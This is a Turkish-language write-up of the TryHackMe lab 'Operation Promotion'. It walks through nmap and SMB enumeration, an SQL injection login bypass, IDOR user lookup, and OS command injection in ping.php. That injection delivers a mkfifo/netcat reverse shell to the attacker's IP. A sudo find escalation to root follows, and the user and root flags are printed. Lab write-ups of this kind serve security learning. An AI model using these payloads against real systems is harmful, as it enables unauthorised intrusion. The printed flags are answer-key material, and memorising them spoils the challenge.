# TryHackMe - Operation Promotion Writeup

## Keşif

İşe her zaman olduğu gibi bir Nmap taramasıyla başladım:

```bash
nmap -sS -A -p- 10.114.167.149
```
<img width="951" height="547" alt="nmap" src="https://github.com/user-attachments/assets/3695a8bf-00e7-4812-a9a1-151cdf0b98f8" />

Elimde üç ilgi çekici nokta vardı: **80 (HTTP)**, **139/445 (SMB)** ve `robots.txt` üzerinde gizlenmeye çalışılmış bir `/admin/` dizini. SSH'ı şimdilik bir kenara bıraktım, çünkü henüz elimde geçerli bir kimlik bilgisi yoktu.

SMB tarafında versiyon ve güvenlik ayarlarını görmek için ek bir tarama attım:

```bash
nmap -p139,445 -sV --script smb-protocols,smb2-security-mode,smb2-time 10.114.167.149
```
<img width="1080" height="444" alt="smbfirst" src="https://github.com/user-attachments/assets/02f3714a-d3c1-4d0a-9ea9-731af47f6291" />

Bu çalışırken paralel olarak web tarafında dizin taramasına başladım:

```bash
ffuf -u http://10.114.167.149/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
<img width="1056" height="521" alt="ffuf" src="https://github.com/user-attachments/assets/be7038f3-15d7-46f3-9154-bd849a070586" />

`admin` dizininin varlığı zaten `robots.txt`'ten belliydi, ffuf bunu doğruladı. Sırayı SMB'den başlatmaya karar verdim çünkü guest erişimi olabilecek bir servis genelde hızlıca sonuç verir.

---

## SMB Enumerasyonu

SMB tarafında önce genel bir keşifle başladım:

```bash
nxc smb 10.114.167.149
nxc smb 10.114.167.149 --shares
nxc smb 10.114.167.149 -u 'guest' -p '' --shares
```

`guest` kullanıcısıyla paylaşımlara erişebildiğimi gördüm. Bunun üzerine `smbclient` ile bağlandım:

```bash
smbclient //10.114.167.149/public -U 'guest%'
get README.txt
```

`README.txt` içeriği şöyleydi:

```
This share is reserved for future internal file distribution.
Nothing to see here yet.

- IT
```

<img width="1135" height="614" alt="SMB" src="https://github.com/user-attachments/assets/194f90f5-16cf-4f31-b0b5-9b4a6a477018" />

Yani SMB tarafı şu an için bir çıkmaz sokaktı — içeride kullanılabilir bir şey yoktu. Bunu not aldım ve dikkatimi tamamen web uygulamasına çevirdim.

---

## Web Uygulaması - Admin Paneline Erişim

<img width="1916" height="525" alt="admindizini" src="https://github.com/user-attachments/assets/c7e7a311-230a-4c8d-843a-c26c2da6c050" />

`robots.txt` beni `/admin/` dizinine yönlendirmişti. Oraya gittiğimde bir login sayfasıyla karşılaştım. Elimde herhangi bir kullanıcı adı ya da parola olmadığı için ilk aklıma gelen klasik **SQL Injection ile auth bypass** denemek oldu.

Kullanıcı adı alanına şunu girdim:

```
username : admin' --
password : 1
```

Bu payload, sorgunun geri kalanını yorum satırına alarak parola kontrolünü devre dışı bırakıyor. Deneme başarılı oldu ve panele giriş yaptım.

<img width="1918" height="642" alt="login" src="https://github.com/user-attachments/assets/c187381d-d429-4ad9-80b9-ae21df4c4c94" />

---

## IDOR - User Lookup

Panele girdikten sonra karşıma **"User Lookup — Look up a user record by ID"** diye bir özellik çıktı. Bu tarz "ID ile kayıt getir" özellikleri genelde IDOR (Insecure Direct Object Reference) açısından incelenmeye değerdir. ID parametresini elle değiştirerek denemeye başladım:

```
http://10.114.167.149/admin/users/lookup.php?id=1
http://10.114.167.149/admin/users/lookup.php?id=2
...
```

ID değerlerini tek tek denerken **`id=7`** karşıma `system` adında bir kullanıcı çıkardı ve bu kayıt bana `/admin/sysmaint-checks/ping.php` diye bir dosyanın varlığından bahsetti.

<img width="930" height="333" alt="id7" src="https://github.com/user-attachments/assets/f3fc67fb-bdca-4832-a3a5-6220f42e354f" />

---

## Command Injection - ping.php

`ping.php` sayfasına gittiğimde şu kullanım bilgisiyle karşılaştım:

```
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

Sayfanın adı ve davranışı bana "muhtemelen arka planda bir `ping` komutu çalıştırılıyor" dedirtti. Bunun bir command injection açığına dönüşüp dönüşmeyeceğini görmek için önce dosyanın kendisini okumayı denedim:

```
http://10.114.167.149/admin/sysmaint-checks/ping.php?host=10.0.0.0;cat%20ping.php
```

<img width="749" height="462" alt="pingphp" src="https://github.com/user-attachments/assets/0ecaa16a-8cc6-44cc-93d8-37660e39e487" />

Bu istek başarılı oldu ve `ping.php` kaynak kodunu görebildim. Kod, `host` parametresini URL'den alıp **hiçbir escape/sanitize işlemi yapmadan** doğrudan bir shell komutunun içine yerleştiriyordu. Yani klasik, ders kitabı örneği bir **OS Command Injection** açığıyla karşı karşıyaydım.

### Reverse Shell

Bunu bir reverse shell almak için kullandım. Öncesinde kendi makinemde bir listener açtım:

```bash
nc -lvnp 4444
```

Sonra aşağıdaki payload'ı hazırladım:

```
host=10.0.0.0;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.154.242 4444 >/tmp/f
```

Bu komutu **URL encode edilmiş** haliyle göndermem gerekti; ilk denemede encode etmeden gönderince shell gelmedi, encode edip yollayınca sorunsuz çalıştı:

```
host=10.0.0.0%3Brm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.154.242%204444%20%3E%2Ftmp%2Ff
```

Listener tarafında shell'i yakaladım.

<img width="1139" height="535" alt="shell" src="https://github.com/user-attachments/assets/202c367d-58eb-487f-9300-badd263ac714" />

---

## Yatay Bilgi Toplama - db.conf

Shell'i aldıktan sonra web uygulamasının konfigürasyon dosyalarına baktım:

```bash
cd /var/www/html/config
cat db.conf
```

Çıktı şu şekildeydi:

```
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_user=jford
```

Elimde bir kullanıcı adı (`jford`) ve bir bcrypt hash'i vardı. Hash'i `john` ve `hashcat` ile kırmayı denedim ama rockyou.txt ile de dahil olmak üzere sonuç alamadım. Bunu not alıp bir kenara koydum, çünkü tek başına ilerlemeyi engellemiyordu.

---

## Brute Force - SSH

Elimde `jford` kullanıcı adı vardı ama parolayı bcrypt hash'inden çözemedim. Bu yüzden doğrudan SSH servisine karşı brute force denemesi yaptım:
Ama yine de bir şeyler bulamadım ve başka birinin yazdığı writeup dan baktım.
Şifre anasayfadaki Spring 2026 yazısından türetilerek bulunması gerekiyormuş :D
Tamamen saçmalık xD

```
Password : spring2026! 
```

```
flag: THM{bdbee0a91ebcb0b0fafde931223efe09}
```


## SSH ile Giriş ve User Flag

Bulduğum kimlik bilgileriyle SSH üzerinden bağlandım:

```bash
ssh jford@10.114.167.149
```

Giriş başarılı oldu ve ilk flag'i ele geçirdim:

```
flag: THM{bdbee0a91ebcb0b0fafde931223efe09}
```
<img width="354" height="81" alt="flag" src="https://github.com/user-attachments/assets/9ff329dd-8732-4b8b-b39b-a3a7b6141c4c" />

---

## Privilege Escalation - sudo find

Sistemde yetkilerimi kontrol etmek için klasik `sudo -l` komutunu çalıştırdım:

```bash
sudo -l
```
<img width="1045" height="99" alt="sudol" src="https://github.com/user-attachments/assets/4357a5a0-6e07-4f06-8eaa-99c3bd66bdcb" />

`find` komutunun şifresiz olarak root yetkisiyle çalıştırılabilmesi, çok bilinen ve sıkça karşılaşılan bir **privilege escalation** açığıdır. `find`'ın `-exec` parametresi ile keyfi komut çalıştırabildiği için doğrudan root shell almak mümkün:

```bash
sudo find . -exec /bin/sh \; -quit
```

Bu komutla root yetkisine yükseldim.

### Root Flag

```bash
cat /root/flag.txt
```

```
THM{d999a1f6319a9c5b48c067dfab314ba2}
```
<img width="660" height="181" alt="flag2" src="https://github.com/user-attachments/assets/8ff806e1-2390-434f-9181-1db567c74ba9" />
